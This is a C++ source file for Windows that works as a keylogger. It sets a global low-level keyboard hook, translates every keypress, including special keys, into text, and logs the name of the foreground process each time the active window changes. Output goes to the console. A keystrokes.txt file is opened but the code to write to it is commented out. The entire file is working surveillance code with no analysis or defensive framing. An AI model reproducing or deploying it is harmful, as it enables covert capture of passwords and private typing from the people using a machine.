#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

HHOOK keyboardHook;
std::ofstream outputFile("keystrokes.txt", std::ios::app);


// Callback function for the keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;

        // Check for key press event (WM_KEYDOWN)
        if (wParam == WM_KEYDOWN)
        {
            // Get the current state of the keyboard
            BYTE keyState[256];
            GetKeyboardState(keyState);

            // Create a buffer to store the character
            WCHAR outputChar[2] = {0};  // We'll store the character here

            // Handle special keys
            switch (keyInfo->vkCode)
            {
                case VK_LSHIFT:
                case VK_RSHIFT:
                {
                    if (wParam == WM_KEYDOWN) 
                    {
                        std::wcout << L"[Shift Pressed] ";

                        if (GetKeyState(VK_SHIFT) & 0x8000) std::wcout << L"[Shift Held] ";
                    }
                
                    // Handle key release
                    else if (wParam == WM_KEYUP) 
                    {
                        std::wcout << L"[Shift Released] ";    
                    }                        
                    break;
                }
                case VK_LCONTROL:
                case VK_RCONTROL:
                    std::wcout << L"[Control] ";        
                    break;
                case VK_LMENU:
                case VK_RMENU:
                    std::wcout << L"[Alt] ";
                    break;
                case VK_CAPITAL:
                    std::wcout << L"[Caps Lock] ";
                    break;
                case VK_BACK:
                    std::wcout << L"[Backspace] ";
                    break;
                case VK_TAB:
                    std::wcout << L"[Tab] ";    
                    break;
                case VK_ESCAPE:
                    std::wcout << L"[Escape] ";
                    break;
                case VK_RETURN:
                    std::wcout << L"[Enter] ";
                    break;
                case VK_SPACE:
                    std::wcout << L"[Space] "; 
                    break;
                case VK_LEFT:
                    std::wcout << L"[<-] "; 
                    break;
                case VK_RIGHT:
                    std::wcout << L"[->] ";
                    break;
                case VK_UP:
                    std::wcout << L"[Up Arrow] ";
                    break;
                case VK_DOWN:
                    std::wcout << L"[Down Arrow] ";
                    break;
                case VK_DELETE:
                    std::wcout << L"[Del] ";
                    break;
                case VK_INSERT:
                    std::wcout << L"[Ins] ";
                    break;
                case VK_LWIN:
                case VK_RWIN:
                    std::wcout << L"[Windows] ";
                    break;
                case VK_NUMPAD0:
                    std::wcout << L"[NumPad 0] ";       
                    break;
                case VK_NUMPAD1:
                    std::wcout << L"[NumPad 1] ";       
                    break;
                case VK_NUMPAD2:
                    std::wcout << L"[NumPad 2] ";       
                    break;
                case VK_NUMPAD3:
                    std::wcout << L"[NumPad 3] ";       
                    break;
                case VK_NUMPAD4:
                    std::wcout << L"[NumPad 4] ";       
                    break;
                case VK_NUMPAD5:
                    std::wcout << L"[NumPad 5] ";       
                    break;
                case VK_NUMPAD6:
                    std::wcout << L"[NumPad 6] ";       
                    break;
                case VK_NUMPAD7:
                    std::wcout << L"[NumPad 7] ";       
                    break;
                case VK_NUMPAD8:
                    std::wcout << L"[NumPad 8] ";       
                    break;
                case VK_NUMPAD9:
                    std::wcout << L"[NumPad 9] ";       
                    break;

                case VK_MULTIPLY:
                    std::wcout << L"[NumPad Multiply] "; 
                    break;
                case VK_ADD:
                    std::wcout << L"[NumPad Add] ";
                    break;
                case VK_SEPARATOR:
                    std::wcout << L"[NumPad Separator] "; 
                    break;
                case VK_SUBTRACT:
                    std::wcout << L"[NumPad Subtract] "; 
                    break;
                case VK_DECIMAL:
                    std::wcout << L"[NumPad Decimal] ";
                    break;
                case VK_DIVIDE:
                    std::wcout << L"[NumPad Divide] ";
                    break;
                default:
                {
                    int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
                    
                    // Check if conversion was successful
                    if (result == 1) std::wcout << outputChar[0] << L" ";   // If we got a valid character

                    else std::wcout << L"[unknown] ";

                    break;
                }
            }
        }
    }

    // Call the next hook in the hook chain
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


void UninstallHook()
{
    if (UnhookWindowsHookEx(keyboardHook))
    {
        std::cout << "Keyboard hook uninstalled successfully." << std::endl;
    } else
    {
        std::cerr << "Failed to uninstall hook." << std::endl;
    }
}

// Callback function for monitoring foreground window changes
void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if (event == EVENT_SYSTEM_FOREGROUND) 
    {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess) {
            char processName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, NULL, processName, MAX_PATH))
            {
                cout << endl << "===============["<< processName << "]===============" << endl;  // Store the keystroke in file
                //outputFile.flush();  // Flush to immediately write to the file
                // std::cout << "Active process: " << processName << std::endl;
            }
            CloseHandle(hProcess);
        }
    }
}

int main()
{
    // Set the event hook to monitor foreground window changes
    HWINEVENTHOOK hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    std::cout << "Capturing keystrokes. Press any key to stop the hook." << std::endl;

    // Message loop to keep the application running and processing window event hooks
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Uninstall the keyboard hook after message loop exits
    UninstallHook();
    
    // Close the output file
    outputFile.close();
    
    // Cleanup the event hook
    UnhookWinEvent(hook);

    return 0;
}
